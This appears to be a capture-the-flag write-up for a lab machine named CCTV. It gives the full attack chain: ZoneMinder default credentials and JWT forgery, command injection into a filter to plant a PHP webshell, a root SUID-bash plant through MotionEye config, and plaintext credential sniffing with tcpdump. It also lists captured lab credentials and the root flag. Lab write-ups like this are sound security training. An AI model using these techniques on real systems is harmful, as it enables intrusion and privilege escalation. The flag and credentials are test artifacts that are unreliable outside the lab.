# Box: CCTV — 2026-03-07 — OWNED

## Target Info
- IP: 10.129.1.155
- OS: Ubuntu Linux (Apache/2.4.58)
- Domain: cctv.htb
- Open Ports: 22 (SSH OpenSSH 9.6p1), 80 (HTTP → cctv.htb)

## Flags
- user.txt: CAPTURED (SSH as sa_mark)
- root.txt: 84ed643f67f25213efa9e9014d24830a

## Credentials
| User | Pass/Hash | Type | Auth Method | Source |
|------|-----------|------|-------------|--------|
| admin | admin | ZoneMinder web | HTTP login | Default creds |
| superadmin | SuperAdmin123! | ZoneMinder web | HTTP login | Changed via forged JWT |
| zmuser | zmpass | MySQL | localhost only | ZM API /api/configs.json |
| sa_mark | X1l9fx1ZjS7RZb | SSH | password | tcpdump plaintext capture on br-1b6b4b93c636 |

## Full Attack Chain

### 1. ZoneMinder — Default Creds + JWT Forgery
- `admin:admin` worked out of the box
- JWT secret was the unchanged default: `"...Change me to something unique..."`
- Forged a superadmin JWT → reset superadmin password to `SuperAdmin123!`

### 2. RCE as www-data — ZM Filter AutoExecuteCmd
- ZoneMinder's filter feature runs a shell command every 10s via `zmfilter` daemon
- Injected command into `filter[AutoExecuteCmd]` as superadmin
- Wrote PHP webshell to `/zm/cache/s.php` → instant RCE via HTTP

```bash
curl -s --get 'http://cctv.htb/zm/cache/s.php' --data-urlencode 'c=COMMAND'
```

### 3. Background Plant — MotionEye on_event_start (prior session)
- MotionEye runs as **root** (`User=root` in systemd unit)
- `on_event_start` in `/etc/motioneye/camera-1.conf` fires whenever motion is detected
- Modified config via MotionEye signed API to append:
  ```
  cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
  ```
- Set `emulate_motion=on` via motion HTTP API (port 7999) so every frame triggers detection
- Also manually sent a relay event via `POST http://127.0.0.1:8765/_relay_event/` (HTTP 200)
- `/tmp/rootbash` did NOT appear immediately — assumed dead end, pivoted away
- **Key insight: don't wait — pivot. The plant kept running in the background.**

### 4. Discovering the Hidden Container Network
- `ip addr` revealed two Docker bridge networks — 172.18.0.0/16 (known) and **172.25.0.0/16 (unexplored)**
- Ping sweep of 172.25.0.x found **172.25.0.10** alive (ARP confirmed)
- Port scan found nothing open — but ARP table showed 172.25.0.11 also existed (the client container)
- `/opt/video/backups/server.log` was the hint: "Authorization as sa_mark successful. Command issued: disk-info" every ~40s — something was polling something as sa_mark

### 5. Capturing sa_mark's Password — tcpdump on the Bridge
- `www-data` had `cap_net_raw` capability (tcpdump without root)
- Ran tcpdump on the Docker bridge interface:
  ```bash
  tcpdump -i br-1b6b4b93c636 -A host 172.25.0.10
  ```
- Within 40 seconds, caught a plaintext TCP connection from 172.25.0.11 → 172.25.0.10:5000:
  ```
  USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-info
  ```
- Custom management service, no TLS, credentials in the clear
- Verified by connecting directly: `echo "USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=status" | nc 172.25.0.10 5000`
  → `All CCTV cameras are operational`

### 6. SSH as sa_mark → user.txt
- fail2ban had banned attacker IP from earlier SSH attempts (`maxretry=3, bantime=3m`)
- Waited 3 minutes, then: `ssh sa_mark@10.129.1.155` with password `X1l9fx1ZjS7RZb`
- user.txt captured

### 7. The Deferred Plant Pays Off — /tmp/rootbash → root.txt
- While running SUID enumeration as sa_mark, found `/tmp/rootbash` in the list
- The MotionEye `on_event_start` command had fired at some point during the session —
  either from the relay event or from `emulate_motion` accumulating 20+ frames
- It fired **in the background while we were busy on the tcpdump path**
- `/tmp/rootbash -p -c "cat /root/root.txt"` → euid=0(root) → flag

```bash
/tmp/rootbash -p -c "id; cat /root/root.txt"
```

## Key Lesson — Pivot, Don't Wait
The MotionEye root plant was set up and appeared to fail. Instead of sitting and retrying,
we pivoted to the tcpdump/credential path. The plant continued running in the background
and delivered root by the time we got user. **Two parallel attack paths, one lands while
you're working the other.**

## Dead Ends (DO NOT RETRY)
- CVE-2023-26035 snapshot injection — patched in 1.37.63
- Reverse shell via /dev/tcp — outbound TCP blocked
- Direct MySQL remote access — port 3306 closed externally
- filter[AutoExecuteCmd] pipe-to-bash tricks — use base64 wrapper instead
- admin user can't save AutoExecuteCmd (needs System:Edit) — use superadmin
- SSH brute force mark (common passwords) — failed
- pkexec/PwnKit — polkit 124, patched
- www-data SSH key — shell is /usr/sbin/nologin
- motion HTTP API on_event_start — "Bad Request" (not settable via motion HTTP API)
- Motion extpipe — "Bad Request"
- Planting SSH key for sa_mark via webshell — /home/sa_mark/ not writable by www-data
- fail2ban-client unban — requires root (socket permission denied)
- mediamtx REST API port 9997 — not exposed on host or container

## System Info
- Users with shells: mark (uid=1000, /bin/bash), sa_mark (uid=1001, /bin/sh)
- /proc hidepid=invisible — can only see own processes
- Capabilities: tcpdump (cap_net_raw) — critical for credential capture
- MotionEye: runs as root (User=root in /etc/systemd/system/motioneye.service)
- Motion: reads RTSP from rtsp://localhost:8554/cam01 (mediamtx container at 172.18.0.3)
- Docker networks:
  - 172.18.0.0/16 (br-3e74116c4022): 172.18.0.3 (mediamtx — ports 1935/RTMP, 8554/RTSP, 8888/HLS)
  - 172.25.0.0/16 (br-1b6b4b93c636): 172.25.0.10 (management service, TCP:5000), 172.25.0.11 (client)
- Custom TCP protocol at 172.25.0.10:5000: `USERNAME=X;PASSWORD=Y;CMD=Z` (plaintext, no TLS)
- /opt/video/backups/server.log — sa_mark auth events every ~40s, written by uid=1005 (container)
- Localhost ports: 7999 (motion ctrl), 1935 (RTMP), 9081 (MJPEG), 8765 (MotionEye), 8888 (mediamtx HLS), 8554 (RTSP), 3306 (MySQL)
- fail2ban: sshd jail, maxretry=3, bantime=3m, findtime=300s
